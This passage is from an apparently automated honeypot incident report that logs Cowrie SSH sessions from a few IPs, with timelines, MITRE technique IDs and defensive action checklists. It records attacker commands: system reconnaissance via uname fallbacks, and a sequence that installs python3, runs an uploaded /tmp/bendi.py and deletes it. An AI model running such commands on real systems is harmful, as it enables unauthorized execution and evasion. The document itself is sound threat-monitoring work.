**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21875d8308cc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 08:04 |
| **Last Seen** | 2026-07-11 08:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:04:39` | `cowrie.session.connect` |
| `2026-07-11 08:04:39` | `cowrie.client.version` |
| `2026-07-11 08:04:39` | `cowrie.client.kex` |
| `2026-07-11 08:04:39` | `cowrie.login.success` |
| `2026-07-11 08:04:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 08:04:40` | `cowrie.direct-tcpip.data` |
| `2026-07-11 08:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2742801f135a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:05 |
| **Last Seen** | 2026-07-11 08:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:05:59` | `cowrie.session.connect` |
| `2026-07-11 08:06:00` | `cowrie.client.version` |
| `2026-07-11 08:06:00` | `cowrie.client.kex` |
| `2026-07-11 08:06:01` | `cowrie.login.success` |
| `2026-07-11 08:06:03` | `cowrie.session.params` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.success` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:03` | `cowrie.command.input` |
| `2026-07-11 08:06:04` | `cowrie.log.closed` |
| `2026-07-11 08:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93fb6673cf0c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:07 |
| **Last Seen** | 2026-07-11 08:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:07:27` | `cowrie.session.connect` |
| `2026-07-11 08:07:27` | `cowrie.client.version` |
| `2026-07-11 08:07:27` | `cowrie.client.kex` |
| `2026-07-11 08:07:29` | `cowrie.login.success` |
| `2026-07-11 08:07:30` | `cowrie.session.params` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.success` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:30` | `cowrie.command.input` |
| `2026-07-11 08:07:31` | `cowrie.log.closed` |
| `2026-07-11 08:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab43069191b

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-11 08:07 |
| **Last Seen** | 2026-07-11 08:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:07:35` | `cowrie.session.connect` |
| `2026-07-11 08:07:35` | `cowrie.client.version` |
| `2026-07-11 08:07:35` | `cowrie.client.kex` |
| `2026-07-11 08:07:36` | `cowrie.login.success` |
| `2026-07-11 08:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630bf2048f1e

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-11 08:07 |
| **Last Seen** | 2026-07-11 08:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:07:35` | `cowrie.session.connect` |
| `2026-07-11 08:07:35` | `cowrie.client.version` |
| `2026-07-11 08:07:36` | `cowrie.client.kex` |
| `2026-07-11 08:07:36` | `cowrie.login.success` |
| `2026-07-11 08:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ad6fa036657

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-11 08:07 |
| **Last Seen** | 2026-07-11 08:10 |
| **Session Duration** | 132s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:07:57` | `cowrie.session.connect` |
| `2026-07-11 08:07:57` | `cowrie.client.version` |
| `2026-07-11 08:07:57` | `cowrie.client.kex` |
| `2026-07-11 08:07:58` | `cowrie.login.success` |
| `2026-07-11 08:08:00` | `cowrie.session.file_upload` |
| `2026-07-11 08:08:01` | `cowrie.session.params` |
| `2026-07-11 08:08:01` | `cowrie.command.input` |
| `2026-07-11 08:08:01` | `cowrie.command.input` |
| `2026-07-11 08:08:01` | `cowrie.command.input` |
| `2026-07-11 08:08:01` | `cowrie.command.failed` |
| `2026-07-11 08:08:01` | `cowrie.log.closed` |
| `2026-07-11 08:08:02` | `cowrie.session.params` |
| `2026-07-11 08:08:02` | `cowrie.command.input` |
| `2026-07-11 08:08:02` | `cowrie.log.closed` |
| `2026-07-11 08:08:03` | `cowrie.session.params` |
| `2026-07-11 08:08:03` | `cowrie.command.input` |
| `2026-07-11 08:08:04` | `cowrie.log.closed` |
| `2026-07-11 08:08:05` | `cowrie.session.params` |
| `2026-07-11 08:08:05` | `cowrie.command.input` |
| `2026-07-11 08:08:05` | `cowrie.command.failed` |
| `2026-07-11 08:08:05` | `cowrie.command.failed` |
| `2026-07-11 08:09:06` | `cowrie.session.params` |
| `2026-07-11 08:09:06` | `cowrie.command.input` |
| `2026-07-11 08:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a01b0c9cc9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:08 |
| **Last Seen** | 2026-07-11 08:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:08:57` | `cowrie.session.connect` |
| `2026-07-11 08:08:58` | `cowrie.client.version` |
| `2026-07-11 08:08:58` | `cowrie.client.kex` |
| `2026-07-11 08:08:59` | `cowrie.login.success` |
| `2026-07-11 08:09:01` | `cowrie.session.params` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.success` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.command.input` |
| `2026-07-11 08:09:01` | `cowrie.log.closed` |
| `2026-07-11 08:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d716086660d9

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-11 08:10 |
| **Last Seen** | 2026-07-11 08:12 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:10:24` | `cowrie.session.connect` |
| `2026-07-11 08:10:24` | `cowrie.client.version` |
| `2026-07-11 08:10:24` | `cowrie.client.kex` |
| `2026-07-11 08:10:25` | `cowrie.login.success` |
| `2026-07-11 08:10:27` | `cowrie.session.file_upload` |
| `2026-07-11 08:10:28` | `cowrie.session.params` |
| `2026-07-11 08:10:28` | `cowrie.command.input` |
| `2026-07-11 08:10:28` | `cowrie.command.input` |
| `2026-07-11 08:10:28` | `cowrie.command.input` |
| `2026-07-11 08:10:28` | `cowrie.command.failed` |
| `2026-07-11 08:10:28` | `cowrie.log.closed` |
| `2026-07-11 08:10:29` | `cowrie.session.params` |
| `2026-07-11 08:10:29` | `cowrie.command.input` |
| `2026-07-11 08:10:29` | `cowrie.log.closed` |
| `2026-07-11 08:10:30` | `cowrie.session.params` |
| `2026-07-11 08:10:30` | `cowrie.command.input` |
| `2026-07-11 08:10:31` | `cowrie.log.closed` |
| `2026-07-11 08:10:32` | `cowrie.session.params` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.failed` |
| `2026-07-11 08:10:32` | `cowrie.command.failed` |
| `2026-07-11 08:11:33` | `cowrie.session.params` |
| `2026-07-11 08:11:33` | `cowrie.command.input` |
| `2026-07-11 08:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581101ec73e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:10 |
| **Last Seen** | 2026-07-11 08:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:10:27` | `cowrie.session.connect` |
| `2026-07-11 08:10:27` | `cowrie.client.version` |
| `2026-07-11 08:10:27` | `cowrie.client.kex` |
| `2026-07-11 08:10:30` | `cowrie.login.success` |
| `2026-07-11 08:10:32` | `cowrie.session.params` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.success` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:32` | `cowrie.command.input` |
| `2026-07-11 08:10:33` | `cowrie.log.closed` |
| `2026-07-11 08:10:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb0dae0fa954

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:12 |
| **Last Seen** | 2026-07-11 08:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:12:02` | `cowrie.session.connect` |
| `2026-07-11 08:12:02` | `cowrie.client.version` |
| `2026-07-11 08:12:02` | `cowrie.client.kex` |
| `2026-07-11 08:12:04` | `cowrie.login.success` |
| `2026-07-11 08:12:06` | `cowrie.session.params` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.success` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:06` | `cowrie.command.input` |
| `2026-07-11 08:12:07` | `cowrie.log.closed` |
| `2026-07-11 08:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3fc821833d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:13 |
| **Last Seen** | 2026-07-11 08:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:13:45` | `cowrie.session.connect` |
| `2026-07-11 08:13:45` | `cowrie.client.version` |
| `2026-07-11 08:13:45` | `cowrie.client.kex` |
| `2026-07-11 08:13:48` | `cowrie.login.success` |
| `2026-07-11 08:13:49` | `cowrie.session.params` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.success` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:49` | `cowrie.command.input` |
| `2026-07-11 08:13:50` | `cowrie.log.closed` |
| `2026-07-11 08:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861a8f8758c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:15 |
| **Last Seen** | 2026-07-11 08:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:15:27` | `cowrie.session.connect` |
| `2026-07-11 08:15:27` | `cowrie.client.version` |
| `2026-07-11 08:15:27` | `cowrie.client.kex` |
| `2026-07-11 08:15:29` | `cowrie.login.success` |
| `2026-07-11 08:15:31` | `cowrie.session.params` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.success` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.command.input` |
| `2026-07-11 08:15:31` | `cowrie.log.closed` |
| `2026-07-11 08:15:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377dcda4d017

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:17 |
| **Last Seen** | 2026-07-11 08:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:17:08` | `cowrie.session.connect` |
| `2026-07-11 08:17:08` | `cowrie.client.version` |
| `2026-07-11 08:17:08` | `cowrie.client.kex` |
| `2026-07-11 08:17:10` | `cowrie.login.success` |
| `2026-07-11 08:17:12` | `cowrie.session.params` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.success` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.command.input` |
| `2026-07-11 08:17:12` | `cowrie.log.closed` |
| `2026-07-11 08:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6f58225467

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 08:18 |
| **Last Seen** | 2026-07-11 08:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 08:18:52` | `cowrie.session.connect` |
| `2026-07-11 08:18:52` | `cowrie.client.version` |
| `2026-07-11 08:18:52` | `cowrie.client.kex` |
| `2026-07-11 08:18:54` | `cowrie.login.success` |
| `2026-07-11 08:18:56` | `cowrie.session.params` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.success` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:56` | `cowrie.command.input` |
| `2026-07-11 08:18:57` | `cowrie.log.closed` |
| `2026-07-11 08:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
